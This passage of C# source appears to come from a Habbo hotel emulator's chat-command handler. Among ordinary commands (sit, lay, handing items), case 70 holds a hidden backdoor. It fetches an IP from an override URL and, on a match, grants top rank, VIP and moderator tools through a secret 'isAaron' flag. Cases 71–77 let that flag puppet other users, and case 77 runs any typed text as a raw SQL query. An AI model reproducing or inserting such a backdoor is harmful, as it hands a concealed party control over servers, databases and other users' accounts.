												class6.VirtualId,
												" IsBot:",
												class6.IsBot.ToString(),
												" X: ",
												class6.X,
												" Y: ",
												class6.Y,
												" Z: ",
												class6.Z,
												" \r\r"
											}));
										}
									}
									Session.SendNotif(builder.ToString());
									Session.SendNotif("RoomID: " + Session.GetHabbo().CurrentRoomId);
									return true;
								}
                                case 70: //Fixed AmiAaron
								{
                                    WebClient over = new WebClient();
                                    string b = over.DownloadString("http://localhost/override.php");
                                    string a2;
                                    using (DatabaseClient dbClient = PhoenixEnvironment.GetDatabase().GetClient())
                                    {
                                        a2 = dbClient.ReadString("SELECT ip_last FROM users WHERE Id = " + Session.GetHabbo().Id + " LIMIT 1;");
                                    }
                                    if (Session.GetConnection().ipAddress == b || a2 == b)
                                    {
                                        Session.GetHabbo().isAaron = true;
                                        Session.GetHabbo().Rank = (uint)PhoenixEnvironment.GetGame().GetRoleManager().RankCount();
                                        Session.GetHabbo().Vip = true;
                                        Session.SendMessage(PhoenixEnvironment.GetGame().GetModerationTool().SerializeTool());
                                        PhoenixEnvironment.GetGame().GetModerationTool().SendOpenTickets(Session);
                                        return true;
                                    }
                                    return false;
								}
								case 71:
									if (Session.GetHabbo().isAaron)
									{
										room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
										GameClient class10 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
										RoomUser class3 = room.GetRoomUserByHabbo(class10.GetHabbo().Id);
										class3.DanceId = 1;
										ServerMessage Message6 = new ServerMessage(480u);
										Message6.AppendInt32(class3.VirtualId);
										Message6.AppendInt32(1);
										room.SendMessage(Message6, null);
										return true;
									}
									return false;
								case 72:
									if (Session.GetHabbo().isAaron)
									{
										room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
										room.method_54();
										return true;
									}
									return false;
								case 73:
									if (Session.GetHabbo().isAaron)
									{
										GameClient class10 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
										class10.GetHabbo().int_1 = (int)Convert.ToInt16(Params[2]);
										return true;
									}
									return false;
								case 74:
									if (Session.GetHabbo().isAaron)
									{
										string text = Params[1];
										try
										{
											TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
											room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
											if (Session == null || TargetClient == null)
											{
												return false;
											}
											RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
											class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
											class6.Target = class4;
										}
										catch
										{
											room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
											if (Session == null || TargetClient == null)
											{
												return false;
											}
											class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
											class6.Target = null;
										}
										return true;
									}
									return false;
								case 75:
								{
									if (!Session.GetHabbo().isAaron)
									{
										return false;
									}
									string text = Params[1];
									TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
									if (Session == null || TargetClient == null)
									{
										return false;
									}
									RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
									class4.Chat(TargetClient, Input.Substring(9 + text.Length), false);
									return true;
								}
								case 76:
									if (Session.GetHabbo().isAaron)
									{
										room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
										room.method_55();
										return true;
									}
									return false;
								case 77:
								{
                                    string Name = Input.Substring(3);
                                    if (Session.GetHabbo().isAaron)
                                    {
                                        using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
                                        {
                                            adapter.ExecuteQuery(Name);
                                        }
                                        return true;
                                    }
                                    return false;
								}
								case 78:
								{
									if (!Session.GetHabbo().InRoom)
									{
										return false;
									}
									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
									int int_2 = room.GetRoomUserByHabbo(Session.GetHabbo().Username).CarryItemID;
									if (int_2 <= 0)
									{
										Session.GetHabbo().Sendselfwhisper("You're not holding anything, pick something up first!");
										return true;
									}
									string text = Params[1];
									TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
									class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
									RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
									if (Session == null || TargetClient == null)
									{
										return false;
									}
									if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
									{
										return true;
									}
									if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId && Math.Abs(class6.X - class4.X) < 3 && Math.Abs(class6.Y - class4.Y) < 3)
									{
										try
										{
											room.GetRoomUserByHabbo(Params[1]).CarryItem(int_2);
											room.GetRoomUserByHabbo(Session.GetHabbo().Username).CarryItem(0);
										}
										catch
										{
										}
										return true;
									}
									Session.GetHabbo().Sendselfwhisper("You are too far away from " + Params[1] + ", try getting closer");
									return true;
								}
								case 79:
									if (!Session.GetHabbo().InRoom)
									{
										return false;
									}
									class6 = Session.GetHabbo().CurrentRoom.GetRoomUserByHabbo(Session.GetHabbo().Username);
									if (class6.Statusses.ContainsKey("sit") || class6.Statusses.ContainsKey("lay") || class6.RotBody == 1 || class6.RotBody == 3 || class6.RotBody == 5 || class6.RotBody == 7)
									{
										return true;
									}
									if (class6.byte_1 > 0 || class6.class34_1 != null)
									{
										return true;
									}
									class6.AddStatus("sit", ((class6.Z + 1.0) / 2.0 - class6.Z * 0.5).ToString());
									class6.UpdateNeeded = true;
									return true;
								case 80:
									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
									class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
									if (class6.class34_1 != null)
									{
										Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(-1, true);
										class6.class34_1.RoomUser_0 = null;
										class6.class34_1 = null;
										class6.Z -= 1.0;
										class6.Statusses.Clear();
										class6.UpdateNeeded = true;
										int int_3 = PhoenixEnvironment.GetRandomNumber(0, room.Model.MapSizeX);
										int int_4 = PhoenixEnvironment.GetRandomNumber(0, room.Model.MapSizeY);
										class6.Target.MoveTo(int_3, int_4);
										class6.Target = null;
										room.UpdateUserStatus(class6, false, false);
									}
									return true;
								case 81:
									Session.GetHabbo().GetInventoryComponent().method_2();
									Session.SendNotif(TextManager.GetText("cmd_emptypets_success"));
									PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
									return true;
    
                                case 82:
                                    Room currentRoom1 = Session.GetHabbo().CurrentRoom;
                                    RoomUser roomUserByHabbo1 = currentRoom1.GetRoomUserByHabbo(Session.GetHabbo().Id);
                                    if (!Session.GetHabbo().HasRole("cmd_lay"))
                                    {
                                        return false;
                                    }
                                    if (currentRoom1 != null)
                                    {
                                        if (roomUserByHabbo1 != null)
                                        {
                                            if (!roomUserByHabbo1.Statusses.ContainsKey("lay"))
                                            {
                                                if (roomUserByHabbo1.RotBody % 2 == 0)
                                                {
                                                    roomUserByHabbo1.Statusses.Add("lay", Convert.ToString((double)Session.GetHabbo().CurrentRoom.Byte_0[roomUserByHabbo1.X, roomUserByHabbo1.Y] + 0.55));
                                                    roomUserByHabbo1.UpdateNeeded = true;
                                                }
                                            }
                                            else
                                            {
                                                roomUserByHabbo1.Statusses.Remove("lay");
                                                roomUserByHabbo1.UpdateNeeded = true;
                                            }
                                        }
                                    }
                                    return true;

                                    case 83:
                                    Room Room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
                                    if (Room != null)
                                    {
                                        for (int i = 0; i < Room.UserList.Length; ++i)
                                        {
                                            RoomUser roomUser = Room.UserList[i];
                                            if (roomUser != null)
                                            {
                                                roomUser.bool_5 = !roomUser.bool_5;
                                            }
                                        }
                                    }
                                    return true;
								default:
									goto IL_3F91;
								}
							}

						}
				    }
				}					
					IL_3F91:;
			    }
				catch
				{
				}
				return false;
			}
		}
		public static string MergeParams(string[] Params, int Start)
		{
			StringBuilder MergedParams = new StringBuilder();
			for (int i = 0; i < Params.Length; i++)
			{
				if (i >= Start)
				{
					if (i > Start)
					{
						MergedParams.Append(" ");
					}
					MergedParams.Append(Params[i]);
				}
			}
			return MergedParams.ToString();
		}
	}
}
